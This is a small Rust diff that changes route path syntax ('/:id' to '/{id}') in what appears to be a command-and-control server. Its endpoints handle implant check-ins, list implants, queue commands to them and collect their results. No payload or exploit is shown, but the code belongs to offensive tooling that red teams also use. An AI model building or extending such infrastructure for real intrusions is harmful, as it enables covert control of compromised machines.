@@ -72,10 +72,10 @@ pub async fn start_server(
         .route("/checkin", post(api::handle_checkin))
         .route("/result", post(api::handle_result))
         .route("/implants", get(api::list_implants))
-        .route("/implants/:id", get(api::get_implant).delete(api::delete_implant))
-        .route("/implants/:id/command", post(api::queue_command))
-        .route("/implants/:id/results", get(api::get_implant_results))
-        .route("/results/:id", get(api::get_result))
+        .route("/implants/{id}", get(api::get_implant).delete(api::delete_implant))
+        .route("/implants/{id}/command", post(api::queue_command))
+        .route("/implants/{id}/results", get(api::get_implant_results))
+        .route("/results/{id}", get(api::get_result))
         .route("/config/sleep", get({
             let sleep = config.sleep_interval;
             move || async move { sleep.to_string() }
